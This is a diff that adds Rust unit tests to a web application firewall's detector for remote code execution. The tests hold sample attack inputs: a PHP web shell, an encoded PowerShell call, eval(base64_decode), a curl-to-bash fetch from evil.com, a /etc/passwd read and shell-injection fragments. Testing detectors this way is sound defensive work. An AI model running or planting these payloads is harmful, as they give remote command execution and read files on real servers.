@@ -177,4 +177,71 @@ mod tests {
         let ctx = make_ctx("action=save&name=hello", "");
         assert!(checker.check(&ctx).is_none());
     }
+
+    #[test]
+    fn detects_php_webshell_in_body() {
+        let checker = RceCheck::new();
+        let ctx = make_ctx("", "<?php system($_GET['cmd']); ?>");
+        let det = checker.check(&ctx).expect("hit");
+        assert!(det.rule_id.as_deref().unwrap_or("").starts_with("RCE-"));
+    }
+
+    #[test]
+    fn detects_powershell_in_query() {
+        let checker = RceCheck::new();
+        let ctx = make_ctx("cmd=powershell+-enc+JABjAA==", "");
+        assert!(checker.check(&ctx).is_some());
+    }
+
+    #[test]
+    fn detects_base64_decode_webshell() {
+        let checker = RceCheck::new();
+        let ctx = make_ctx("", "eval(base64_decode('SQLI'))");
+        assert!(checker.check(&ctx).is_some());
+    }
+
+    #[test]
+    fn detects_curl_c2_in_body() {
+        let checker = RceCheck::new();
+        let ctx = make_ctx("", "curl http://evil.com/shell.sh | bash");
+        assert!(checker.check(&ctx).is_some());
+    }
+
+    #[test]
+    fn detects_etc_passwd_in_body() {
+        let checker = RceCheck::new();
+        let ctx = make_ctx("", "file=/etc/passwd&action=read");
+        assert!(checker.check(&ctx).is_some());
+    }
+
+    #[test]
+    fn skipped_when_rce_disabled() {
+        let checker = RceCheck::new();
+        let ctx = RequestCtx {
+            req_id: "test".to_string(),
+            client_ip: "127.0.0.1".parse::<IpAddr>().unwrap(),
+            client_port: 0,
+            method: "POST".to_string(),
+            host: "example.com".to_string(),
+            port: 80,
+            path: "/".to_string(),
+            query: "cmd=ls|cat".to_string(),
+            headers: HashMap::new(),
+            body_preview: bytes::Bytes::from("$(id)"),
+            content_length: 5,
+            is_tls: false,
+            host_config: Arc::new(HostConfig {
+                defense_config: DefenseConfig {
+                    rce: false,
+                    ..DefenseConfig::default()
+                },
+                ..HostConfig::default()
+            }),
+            geo: None,
+            tier: waf_common::tier::Tier::CatchAll,
+            tier_policy: waf_common::RequestCtx::default_tier_policy(),
+            cookies: std::collections::HashMap::new(),
+        };
+        assert!(checker.check(&ctx).is_none());
+    }
 }
